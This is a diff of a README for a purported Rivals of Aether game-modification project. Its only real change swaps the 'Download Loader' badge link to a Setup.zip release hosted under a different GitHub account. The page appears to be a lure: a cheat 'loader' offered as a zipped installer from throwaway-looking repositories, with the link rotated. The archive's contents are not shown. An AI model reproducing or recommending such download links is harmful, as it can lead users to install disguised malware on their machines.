@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Rivals of Aether Runner
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Rivals-of-Aether-Runner` · Updated: 2026-10-30
 
 **Tags:** `rivals-of-aether` `fighting` `platform-fighter` `indie`
+
